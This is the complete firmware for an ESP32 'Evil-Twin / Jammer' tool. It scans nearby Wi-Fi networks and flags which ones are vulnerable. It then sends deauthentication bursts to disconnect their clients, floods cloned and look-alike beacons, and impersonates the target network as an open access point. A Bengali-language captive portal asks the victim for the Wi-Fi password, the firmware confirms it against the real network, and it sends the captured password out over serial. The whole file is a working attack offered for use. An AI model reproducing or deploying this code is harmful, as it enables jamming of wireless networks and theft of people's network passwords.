/* =========================================================
   ESP32 Evil-Twin / Jammer  v7.1 — Fixed Rom Delay Header
   ========================================================= */
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>

#define CTL Serial2
#define AP_MAXCONN 4
#define MAXT      6
#define MAXSCAN   40
#define MAXCLI    20
#define QN        48

struct ScanEnt { char ssid[33]; uint8_t bssid[6]; int32_t rssi; uint8_t ch; uint8_t enc; uint8_t pmf; };
ScanEnt scanList[MAXSCAN]; int scanCount = 0;

struct Target { uint8_t bssid[6]; char ssid[33]; uint8_t slen; uint8_t ch; };
Target tg[MAXT]; volatile int tcount = 0;

struct Cli { uint8_t mac[6]; uint32_t last; bool down; };
Cli cli[MAXCLI]; int cliN = 0;

volatile bool attacking = false, hold = false, rotOn = false, bfloodOn = true;
volatile int rotIdx = 0, assocIdx = 0;
volatile uint8_t dupCount = 4;
volatile uint32_t txOk = 0, txFail = 0, fakeSent = 0;
uint8_t apCh = 1, apMac[6]; uint16_t seqNo = 0;

WebServer web(80); DNSServer dns;

char qbuf[QN][100]; volatile uint8_t qh = 0, qt = 0;
void flushQ() {
  while (qt != qh) { CTL.write((const uint8_t*)qbuf[qt], strlen(qbuf[qt])); CTL.write('\n'); qt = (qt + 1) % QN; }
}
void ev(const String &s) {
  uint8_t n = (qh + 1) % QN;
  if (n == qt) qt = (qt + 1) % QN;
  strncpy(qbuf[qh], s.c_str(), 99); qbuf[qh][99] = 0;
  qh = n; flushQ();
}

void apSetSSID(const char *ssid) {
  wifi_config_t cfg;
  if (esp_wifi_get_config(WIFI_IF_AP, &cfg) != ESP_OK) { WiFi.softAP(ssid, NULL, apCh, 0, AP_MAXCONN); return; }
  memset(cfg.ap.ssid, 0, 32);
  strncpy((char*)cfg.ap.ssid, ssid, 32);
  cfg.ap.ssid_len = strlen(ssid);
  cfg.ap.authmode = WIFI_AUTH_OPEN;
  memset(cfg.ap.password, 0, 64);
  cfg.ap.channel = apCh; cfg.ap.ssid_hidden = 0;
  cfg.ap.max_connection = AP_MAXCONN; cfg.ap.beacon_interval = 100;
  if (esp_wifi_set_config(WIFI_IF_AP, &cfg) != ESP_OK) WiFi.softAP(ssid, NULL, apCh, 0, AP_MAXCONN);
  WiFi.setSleep(false);
}

void inj(uint8_t *f, int n) { if (esp_wifi_80211_tx(WIFI_IF_AP, f, n, false) == ESP_OK) txOk++; else txFail++; }

const char *encName(uint8_t e) {
  switch (e) {
    case 0: return "OPEN"; case 1: return "WEP"; case 2: return "WPA";
    case 3: return "WPA2"; case 4: return "WPA/WPA2"; case 5: return "WPA2-ENT";
    case 6: return "WPA3"; case 7: return "WPA2/WPA3"; default: return "?";
  }
}
const char *diffTag(const ScanEnt &e) {
  if (e.enc <= 1) return "YES";
  if (e.enc == 6) return "NO";
  if (e.enc == 5) return "MAYBE";
  if (e.pmf & 0x02) return "NO";
  if (e.pmf & 0x01) return "MAYBE";
  return "YES";
}

struct PmfEnt { uint8_t b[6]; uint8_t f; };
PmfEnt pmfTab[40]; int pmfN = 0;

IRAM_ATTR void scanSniff(void *buf, wifi_promiscuous_pkt_type_t t) {
  const wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;
  if (p->rx_ctrl.sig_len < 40) return;
  const uint8_t *m = p->payload;
  if ((m[0] & 0xFC) != 0x80) return;
  const uint8_t *ie = m + 36, *end = m + p->rx_ctrl.sig_len;
  while (ie + 2 <= end) {
    uint8_t id = ie[0], ln = ie[1];
    if (id == 48 && ln >= 8 && ie + 2 + ln <= end) {
      const uint8_t *b = ie + 2; int q = 6;
      if (q + 2 > ln) return;
      q += 2 + (b[q] | (b[q + 1] << 8)) * 4;
      if (q + 2 > ln) return;
      q += 2 + (b[q] | (b[q + 1] << 8)) * 4;
      if (q + 2 > ln) return;
      if (pmfN < 40) { memcpy(pmfTab[pmfN].b, m + 16, 6); pmfTab[pmfN].f = b[q]; pmfN++; }
      return;
    }
    ie += 2 + ln;
  }
}

int mkDeauth(uint8_t *f, const uint8_t *da, const uint8_t *sa, const uint8_t *b, uint8_t rs) {
  memset(f, 0, 26);
  f[0] = 0xC0; memcpy(&f[4], da, 6); memcpy(&f[10], sa, 6); memcpy(&f[16], b, 6); f[24] = rs;
  return 26;
}
int mkBeacon(uint8_t *b, const uint8_t *bs, const char *ss, uint8_t sl, uint8_t ch, bool probe, const uint8_t *da) {
  memset(b, 0, 100);
  b[0] = probe ? 0x50 : 0x80;
  if (probe) memcpy(&b[4], da, 6); else memset(&b[4], 0xFF, 6);
  memcpy(&b[10], bs, 6); memcpy(&b[16], bs, 6);
  seqNo++; b[22] = (seqNo & 0x0F) << 4; b[23] = seqNo >> 4;
  b[32] = 0x64; b[34] = 0x01; b[35] = 0x04;
  int p = 36;
  b[p++] = 0x00; b[p++] = sl; memcpy(&b[p], ss, sl); p += sl;
  b[p++] = 0x01; b[p++] = 0x08;
  const uint8_t r[8] = {0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
  memcpy(&b[p], r, 8); p += 8;
  b[p++] = 0x03; b[p++] = 0x01; b[p++] = ch;
  return p;
}

void cliTouch(const uint8_t *m) {
  for (int i = 0; i < cliN; i++) if (!memcmp(cli[i].mac, m, 6)) { cli[i].last = millis(); cli[i].down = false; return; }
  if (cliN >= MAXCLI) return;
  memcpy(cli[cliN].mac, m, 6); cli[cliN].last = millis(); cli[cliN].down = false; cliN++;
}

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (!attacking || hold) return;
  const wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;
  if (p->rx_ctrl.sig_len < 24) return;
  const uint8_t *m = p->payload;
  uint8_t st = m[0] & 0x0F, ty = (m[0] >> 2) & 0x03;
  const uint8_t *a1 = m + 4, *a2 = m + 10;

  if (ty == 0 && st == 0x04) {
    const uint8_t *ie = m + 24, *end = m + p->rx_ctrl.sig_len;
    while (ie + 2 <= end) {
      uint8_t id = ie[0], ln = ie[1];
      if (id == 0 && ie + 2 + ln <= end) {
        for (int i = 0; i < tcount; i++)
          if (ln == tg[i].slen && !memcmp(ie + 2, tg[i].ssid, ln)) {
            uint8_t r[100]; int n = mkBeacon(r, tg[i].bssid, tg[i].ssid, tg[i].slen, apCh, true, a2);
            esp_wifi_80211_tx(WIFI_IF_AP, r, n, false); fakeSent++; return;
          }
      }
      ie += 2 + ln;
    }
    return;
  }

  int hit = -1; const uint8_t *peer = NULL;
  for (int i = 0; i < tcount; i++) {
    if (!memcmp(a1, tg[i].bssid, 6)) { hit = i; peer = a2; break; }
    if (!memcmp(a2, tg[i].bssid, 6)) { hit = i; peer = a1; break; }
  }
  if (hit < 0 || !peer || (peer[0] & 0x01)) return;
  if (!memcmp(peer, tg[hit].bssid, 6)) return;

  cliTouch(peer);
  int burst = (ty == 0 && (st == 0x0B || st == 0x00 || st == 0x02)) ? 6 : 2;
  uint8_t f[26];
  for (int k = 0; k < burst; k++) {
    mkDeauth(f, peer, tg[hit].bssid, tg[hit].bssid, 7); inj(f, 26);
    mkDeauth(f, tg[hit].bssid, peer, tg[hit].bssid, 2); inj(f, 26);
  }
}

void attackTask(void *) {
  uint8_t bf[100], f[26]; uint16_t c = 0; uint32_t lastFlood = 0;
  const uint8_t bc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  vTaskDelay(1200 / portTICK_PERIOD_MS);
  while (true) {
    if (!attacking || hold || tcount == 0) { vTaskDelay(50 / portTICK_PERIOD_MS); continue; }
    for (int i = 0; i < tcount; i++) {
      mkDeauth(f, bc, tg[i].bssid, tg[i].bssid, 7); inj(f, 26);
      mkDeauth(f, bc, tg[i].bssid, tg[i].bssid, 2); inj(f, 26);
      mkDeauth(f, bc, tg[i].bssid, tg[i].bssid, 1); inj(f, 26);
      vTaskDelay(2 / portTICK_PERIOD_MS);
    }
    if (bfloodOn && millis() - lastFlood > 300) {
      lastFlood = millis();
      for (int i = 0; i < tcount; i++) {
        for (int d = 0; d < dupCount; d++) {
          uint8_t fk[6]; memcpy(fk, apMac, 6);
          c++; fk[3] = 0x10 + (c >> 8); fk[4] = c & 0xFF; fk[5] = (c >> 4) & 0xFF;
          int n = mkBeacon(bf, fk, tg[i].ssid, tg[i].slen, apCh, false, NULL);
          inj(bf, n); fakeSent++;
        }
        const char *sfx[3] = {"_5G", "_EXT", "_Free"};
        for (int d = 0; d < 3; d++) {
          uint8_t fk[6]; memcpy(fk, apMac, 6);
          c++; fk[3] = 0x80 + d; fk[4] = c & 0xFF; fk[5] = (c >> 6) & 0xFF;
          char nm[36]; snprintf(nm, sizeof(nm), "%.28s%s", tg[i].ssid, sfx[d]);
          int n = mkBeacon(bf, fk, nm, strlen(nm), apCh, false, NULL);
          inj(bf, n); fakeSent++;
        }
      }
    }
    vTaskDelay(10 / portTICK_PERIOD_MS);
  }
}

void statusTask(void *) {
  int lastDown = -1; uint32_t lastAlive = 0;
  while (true) {
    vTaskDelay(1000 / portTICK_PERIOD_MS);
    if (millis() - lastAlive > 5000) { lastAlive = millis(); ev("EV ALIVE " + String(txOk) + " " + String(WiFi.softAPgetStationNum())); }
    if (!attacking) { lastDown = -1; continue; }
    int seen = 0, down = 0; uint32_t now = millis();
    for (int i = 0; i < cliN; i++) {
      seen++;
      if (!cli[i].down && now - cli[i].last > 7000) cli[i].down = true;
      if (cli[i].down) down++;
    }
    if (down != lastDown) {
      lastDown = down;
      ev("EV JAM " + String(tg[assocIdx < tcount ? assocIdx : 0].ssid) + " " + String(seen) + " " + String(down));
      if (seen && down >= seen) ev("EV LIST semua-terlempar");
    }
  }
}

void rotateTask(void *) {
  vTaskDelay(3000 / portTICK_PERIOD_MS);
  while (true) {
    if (attacking && rotOn && tcount > 1 && WiFi.softAPgetStationNum() == 0) {
      rotIdx = (rotIdx + 1) % tcount; apSetSSID(tg[rotIdx].ssid);
    }
    vTaskDelay(3000 / portTICK_PERIOD_MS);
  }
}

bool verifyPW(const char *ssid, const char *pw, uint8_t ch, const uint8_t *b) {
  hold = true; vTaskDelay(250 / portTICK_PERIOD_MS);
  WiFi.mode(WIFI_AP_STA); WiFi.disconnect(false, false);
  vTaskDelay(150 / portTICK_PERIOD_MS);
  WiFi.begin(ssid, pw, ch, b);
  bool ok = false; uint32_t t0 = millis();
  while (millis() - t0 < 8000) { if (WiFi.status() == WL_CONNECTED) { ok = true; break; } vTaskDelay(150 / portTICK_PERIOD_MS); }
  WiFi.disconnect(false, false); vTaskDelay(120 / portTICK_PERIOD_MS);
  WiFi.mode(WIFI_AP_STA); WiFi.setSleep(false);
  hold = false; return ok;
}

String page(const String &ssid, const String &body) {
  String h = "<!doctype html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'><title>WiFi</title><style>"
    "body{font-family:system-ui;margin:0;background:#0d1117;color:#e6edf3}"
    ".c{max-width:420px;margin:14vh auto;padding:26px;background:#161b22;border-radius:14px;border:1px solid #30363d}"
    "h2{margin:0 0 6px;font-size:19px}p{color:#8b949e;font-size:14px}"
    "input{width:100%;padding:12px;margin:12px 0;border-radius:8px;border:1px solid #30363d;"
    "background:#0d1117;color:#e6edf3;font-size:16px;box-sizing:border-box}"
    "button{width:100%;padding:12px;border:0;border-radius:8px;background:#238636;color:#fff;font-size:16px;font-weight:600}"
    "</style></head><body><div class='c'><h2>";
  h += ssid; h += "</h2>"; h += body; h += "</div></body></html>"; return h;
}
int curIdx() { int i = assocIdx; if (i < 0 || i >= tcount) i = 0; return i; }

void handleRoot() {
  if (!tcount) { web.send(200, "text/html", page("WiFi", "<p>টার্গেট নেই</p>")); return; }
  web.send(200, "text/html", page(tg[curIdx()].ssid,
    "<p>নেটওয়ার্কে ঢুকতে WiFi পাসওয়ার্ড দিন</p>"
    "<form method='POST' action='/submit'><input name='pw' type='password' placeholder='পাসওয়ার্ড' autofocus required>"
    "<button>কানেক্ট</button></form>"));
}

void hardStop() {
  attacking = false;
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  apCh = 1;
  esp_wifi_set_channel(apCh, WIFI_SECOND_CHAN_NONE);
  WiFi.softAP("ESP32-TWIN", NULL, apCh, 1, AP_MAXCONN);
  esp_wifi_deauth_sta(0);
}

void handleSubmit() {
  if (!tcount) { web.send(200, "text/html", page("WiFi", "<p>টার্গেট নেই</p>")); return; }
  int idx = curIdx(); String ssid = String(tg[idx].ssid), pw = web.arg("pw");
  ev("EV PW " + ssid + " " + pw);
  bool ok = verifyPW(tg[idx].ssid, pw.c_str(), tg[idx].ch, tg[idx].bssid);
  ev(String("EV CHK ") + ssid + " " + pw + " " + (ok ? "OK" : "FAIL"));
  if (ok) {
    ev("EV DONE " + ssid + " " + pw);
    web.send(200, "text/html", page(ssid, "<p style='color:#3fb950'>✔ পাসওয়ার্ড সঠিক</p>"));
    vTaskDelay(1500 / portTICK_PERIOD_MS);
    hardStop();
  } else {
    apSetSSID(tg[idx].ssid);
    web.send(200, "text/html", page(ssid,
      "<p style='color:#f85149'>✘ পাসওয়ার্ড ভুল</p>"
      "<form method='POST' action='/submit'><input name='pw' type='password' placeholder='আবার চেষ্টা করুন' autofocus required>"
      "<button>কানেক্ট</button></form>"));
  }
}

void doScan() {
  bool was = attacking; attacking = false; hold = true;
  pmfN = 0;
  wifi_promiscuous_filter_t mf = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
  esp_wifi_set_promiscuous_filter(&mf);
  esp_wifi_set_promiscuous_rx_cb(&scanSniff);
  esp_wifi_set_promiscuous(true);

  ev("EV SCAN start");
  WiFi.scanDelete(); int n = WiFi.scanNetworks(false, false); scanCount = 0;
  for (int i = 0; i < n && scanCount < MAXSCAN; i++) {
    if (WiFi.SSID(i).length() == 0) continue;
    ScanEnt &e = scanList[scanCount];
    strncpy(e.ssid, WiFi.SSID(i).c_str(), 32); e.ssid[32] = 0;
    memcpy(e.bssid, WiFi.BSSID(i), 6);
    e.rssi = WiFi.RSSI(i); e.ch = WiFi.channel(i); e.enc = WiFi.encryptionType(i);
    e.pmf = 0;
    for (int k = 0; k < pmfN; k++) if (!memcmp(pmfTab[k].b, e.bssid, 6)) { e.pmf = pmfTab[k].f; break; }
    scanCount++;
    ev("AP " + String(scanCount - 1) + " " + String(e.rssi) + " " + String(e.ch) + " " +
       String(e.enc) + " " + encName(e.enc) + " " + diffTag(e) + " " + String(e.ssid));
  }
  WiFi.scanDelete(); ev("EV SCAN end");
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  hold = false; if (was) attacking = true;
}

void handleCmd(String line) {
  line.trim();
  if (!line.length()) return;
  if (line[0] < 'A' || line[0] > 'Z') return;

  if (line == "PING") { ev("PONG"); return; }
  if (line == "SCAN") { doScan(); return; }
  if (line == "TX") { ev("EV TX " + String(txOk) + " " + String(txFail) + " " + String(fakeSent) + " " + String(WiFi.softAPgetStationNum())); return; }
  if (line == "BF0") { bfloodOn = false; ev("EV BF off"); return; }
  if (line == "BF1") { bfloodOn = true;  ev("EV BF on"); return; }
  if (line.startsWith("DUP ")) { dupCount = constrain(line.substring(4).toInt(), 0, 40); ev("EV DUP " + String(dupCount)); return; }
  if (line == "STOP") { hardStop(); hold = false; ev("EV STOPPED"); return; }

  if (line.startsWith("START ")) {
    String rest = line.substring(6); tcount = 0; int p = 0;
    while (p < (int)rest.length() && tcount < MAXT) {
      int c = rest.indexOf(',', p); if (c < 0) c = rest.length();
      int idx = rest.substring(p, c).toInt();
      if (idx >= 0 && idx < scanCount) {
        memcpy(tg[tcount].bssid, scanList[idx].bssid, 6);
        strncpy(tg[tcount].ssid, scanList[idx].ssid, 32); tg[tcount].ssid[32] = 0;
        tg[tcount].slen = strlen(tg[tcount].ssid);
        tg[tcount].ch = scanList[idx].ch; tcount++;
      }
      p = c + 1;
    }
    if (!tcount) { ev("EV ERR no-target"); return; }
    for (int i = 1; i < tcount; i++) if (tg[i].ch != apCh) ev("EV WARN ch" + String(tg[i].ch) + " different");

    cliN = 0; rotIdx = 0; assocIdx = 0; rotOn = (tcount > 1);
    apCh = tg[0].ch;
    esp_wifi_set_max_tx_power(78);
    esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW_HT20);
    esp_wifi_set_channel(apCh, WIFI_SECOND_CHAN_NONE);
    apSetSSID(tg[0].ssid);

    wifi_promiscuous_filter_t fl = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&fl);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
    esp_wifi_set_promiscuous(true);

    txOk = txFail = fakeSent = 0; hold = false; attacking = true;
    ev("EV STARTED " + String(tcount) + " ch" + String(apCh));
    ev("EV JAM " + String(tg[0].ssid) + " 0 0");
    return;
  }
  ev("EV ERR unknown");
}

void setup() {
  Serial.begin(115200); delay(600);
  CTL.begin(115200, SERIAL_8N1, 16, 17);
  WiFi.persistent(false); WiFi.mode(WIFI_AP_STA); WiFi.setSleep(false);
  wifi_country_t cn = {.cc = "BD", .schan = 1, .nchan = 13, .max_tx_power = 20, .policy = WIFI_COUNTRY_POLICY_MANUAL};
  esp_wifi_set_country(&cn);
  apCh = 1;
  WiFi.softAP("ESP32-TWIN", NULL, apCh, 1, AP_MAXCONN);
  esp_wifi_get_mac(WIFI_IF_AP, apMac);
  esp_wifi_set_max_tx_power(78);
  delay(300);
  dns.start(53, "*", WiFi.softAPIP());
  web.on("/", handleRoot); web.on("/submit", HTTP_POST, handleSubmit); web.onNotFound(handleRoot);
  web.begin();
  xTaskCreatePinnedToCore(attackTask, "atk", 4096, NULL, 4, NULL, 1);
  xTaskCreatePinnedToCore(statusTask, "st",  4096, NULL, 2, NULL, 1);
  xTaskCreatePinnedToCore(rotateTask, "rot", 4096, NULL, 2, NULL, 1);
}

String rxBuf;
void loop() {
  dns.processNextRequest(); web.handleClient();
  while (CTL.available()) {
    char c = CTL.read();
    if (c == '\n') { handleCmd(rxBuf); rxBuf = ""; }
    else if (c != '\r' && rxBuf.length() < 200) rxBuf += c;
  }
  static int lastSta = 0; int now = WiFi.softAPgetStationNum();
  if (now > lastSta && attacking && tcount > 0) {
    assocIdx = rotIdx; apSetSSID(tg[assocIdx].ssid);
    ev("EV ASSOC " + String(tg[assocIdx].ssid));
  }
  lastSta = now;
}
